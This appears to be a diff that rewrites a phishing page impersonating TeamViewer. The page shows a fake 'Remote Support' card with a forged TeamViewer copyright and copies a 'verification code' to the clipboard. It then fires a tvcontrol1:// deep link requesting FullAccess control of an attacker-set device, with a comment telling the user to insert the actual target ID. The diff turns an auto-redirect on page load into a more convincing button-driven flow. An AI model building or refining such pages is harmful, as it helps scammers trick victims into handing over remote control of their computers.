@@ -1,53 +1,146 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TeamViewer Security Check</title>
+    <title>TeamViewer Remote Support</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding-top: 20vh;
-            background: #f5f5f5;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
-        .dialog {
+        .card {
             background: white;
-            border: 1px solid #ccc;
-            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+            width: 90%;
             max-width: 400px;
-            margin: 0 auto;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 32px 24px;
+            text-align: center;
         }
-        h2 { color: #00467f; }
-        .code {
-            font-size: 2em;
-            font-weight: bold;
-            margin: 20px 0;
-            background: #eef;
-            padding: 10px;
-            border-radius: 4px;
+        .logo {
+            width: 48px;
+            height: 48px;
+            background: #0E8ED5;
+            border-radius: 12px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .logo svg {
+            width: 28px;
+            height: 28px;
+            fill: white;
+        }
+        h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #111;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        .code-box {
+            background: #f5f7fa;
+            border: 1px dashed #bac8d9;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+        .code-label {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #777;
+            margin-bottom: 6px;
+        }
+        .code-value {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0E8ED5;
+            letter-spacing: 2px;
+        }
+        .button {
+            background: #0E8ED5;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 0;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .button:hover { background: #0b7ab8; }
+        .footer {
+            font-size: 11px;
+            color: #999;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="dialog">
-        <h2>Security Verification</h2>
-        <p>We are securing your connection.<br>Please wait...</p>
-        <p>When the TeamViewer app opens,<br>enter the following verification code:</p>
-        <div class="code" id="code">n79ktdgt</div>
-        <p><small>This code will expire in 5 minutes.</small></p>
+    <div class="card">
+        <div class="logo">
+            <!-- TeamViewer icon (simplified) -->
+            <svg viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+            </svg>
+        </div>
+        <h1>TeamViewer Remote Support</h1>
+        <p class="subtitle">
+            Your technician has initiated a secure remote session.<br>
+            Tap the button below to copy the verification code and open the app.
+        </p>
+        <div class="code-box">
+            <div class="code-label">Verification Code</div>
+            <div class="code-value" id="code">n79ktdgt</div>
+        </div>
+        <button class="button" id="connectBtn">
+            Copy Code &amp; Open TeamViewer
+        </button>
+        <p class="footer">
+            You will be asked to enter this code in the app.<br>
+            &copy; 2026 TeamViewer Germany GmbH
+        </p>
     </div>
 
     <script>
-        window.location = "tvcontrol1://control?device=791826887&authorization=FullAccess";
+        const code = "n79ktdgt";
+        const deviceId = "791826887";  // replace with your actual target ID
+        const deepLink = `tvcontrol1://control?device=${deviceId}&authorization=FullAccess`;
 
-        setTimeout(function(){
-            if (document.hasFocus()) {
-                window.location = "tvcontrol1://control?device=791826887&authorization=FullAccess";
+        document.getElementById("connectBtn").addEventListener("click", async function(e) {
+            // 1. Copy the password to clipboard
+            try {
+                await navigator.clipboard.writeText(code);
+                console.log("Password copied to clipboard.");
+            } catch (err) {
+                console.warn("Clipboard copy failed, user may need to type.");
             }
-        }, 1000);
+
+            // 2. Trigger the deep link after a tiny delay
+            setTimeout(() => {
+                window.location = deepLink;
+            }, 300);
+        });
+
+        // Fallback: also try direct deep link on page load (if the user came from a direct link)
+        window.addEventListener('load', function() {
+            // Optionally auto-trigger after 5 seconds as a second chance
+            // (but the main flow is via button)
+        });
     </script>
 </body>
 </html>
